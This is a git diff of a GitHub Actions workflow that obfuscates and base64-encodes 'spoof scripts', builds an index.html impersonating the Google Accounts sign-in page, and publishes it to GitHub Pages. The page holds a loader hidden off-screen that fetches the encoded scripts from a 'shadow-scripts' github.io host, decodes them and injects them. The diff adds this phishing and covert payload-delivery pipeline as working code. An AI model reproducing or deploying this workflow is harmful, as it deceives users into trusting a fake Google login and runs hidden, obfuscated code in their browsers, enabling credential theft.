@@ -1,9 +1,10 @@
-name: 🔁 Auto-update Index Loader
+name: 🔁 Auto-obfuscate, inject, and deploy Loader
 
 on:
   push:
     paths:
-      - 'obfuscated/*.b64'
+      - 'src-scripts/*.js'
+      - '.github/workflows/update-index.yml'
   schedule:
     - cron: "0 */6 * * *" # every 6 hours
   workflow_dispatch:
@@ -14,16 +15,35 @@ jobs:
 
     steps:
       - name: 📥 Checkout
-        uses: actions/checkout@v3
+        uses: actions/checkout@v4
 
       - name: 🛠 Setup Node
-        uses: actions/setup-node@v3
+        uses: actions/setup-node@v4
         with:
           node-version: 18
 
+      - name: 📦 Install obfuscator
+        run: |
+          npm install -g javascript-obfuscator
+
+      - name: 🔐 Obfuscate and Base64-encode spoof scripts
+        run: |
+          mkdir -p obfuscated
+          rm -f obfuscated/*.js.b64 obfuscated/*.ob.js || true
+          for f in src-scripts/*.js; do
+            base=$(basename "$f" .js)
+            javascript-obfuscator "$f" --output "obfuscated/${base}.ob.js" --compact true --self-defending true --control-flow-flattening true
+            base64 "obfuscated/${base}.ob.js" > "obfuscated/${base}.js.b64"
+          done
+
       - name: 🔁 Generate index.html loader
         run: |
-          echo '<!DOCTYPE html>
+          out="index.html"
+          cd obfuscated/
+          files=$(find . -name "*.js.b64" | sed 's|^\./||g' | jq -R . | jq -s .)
+          cd ..
+          cat > "$out" <<EOF
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -31,27 +51,14 @@ jobs:
   <title>Sign in – Google Accounts</title>
   <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png">
   <style>
-    body {
-      margin: 0;
-      background: #fff;
-      font-family: "Roboto", sans-serif;
-    }
-    .hidden-loader {
-      position: fixed;
-      top: -9999px;
-      left: -9999px;
-      visibility: hidden;
-    }
+    body { margin: 0; background: #fff; font-family: "Roboto", sans-serif; }
+    .hidden-loader { position: fixed; top: -9999px; left: -9999px; visibility: hidden; }
   </style>
 </head>
 <body>
   <div class="hidden-loader" id="injector"></div>
   <script>
-    const spoofTargets = [' > index.html
-
-          find obfuscated/ -name "*.b64" | sed 's|obfuscated/||g' | sed "s/.*/  \"&\",/" >> index.html
-
-          echo '    ];
+    const spoofTargets = $files;
     const cdnBase = "https://popdeuxrem.github.io/shadow-scripts/obfuscated/";
     spoofTargets.forEach(async (file) => {
       try {
@@ -61,19 +68,27 @@ jobs:
         const script = document.createElement("script");
         script.textContent = decoded;
         document.getElementById("injector").appendChild(script);
-        console.log(`[✓] Injected: ${file}`);
+        console.log(\`[✓] Injected: \${file}\`);
       } catch (e) {
-        console.error(`[✗] Failed: ${file}`, e);
+        console.error(\`[✗] Failed: \${file}\`, e);
       }
     });
   </script>
 </body>
-</html>' >> index.html
+</html>
+EOF
 
       - name: 📤 Commit & Push
         run: |
           git config user.name "popdeuxrem"
           git config user.email "174709939+popdeuxrem@users.noreply.github.com"
-          git add index.html
-          git diff --cached --quiet || git commit -m "🔁 Auto-update index.html [skip ci]"
+          git add obfuscated/ index.html
+          git diff --cached --quiet || git commit -m "🔁 Auto-obfuscate, base64, inject, deploy [skip ci]"
           git push
+
+      - name: 🚀 Deploy to GitHub Pages
+        uses: peaceiris/actions-gh-pages@v4
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          publish_dir: ./
+          publish_branch: gh-pages
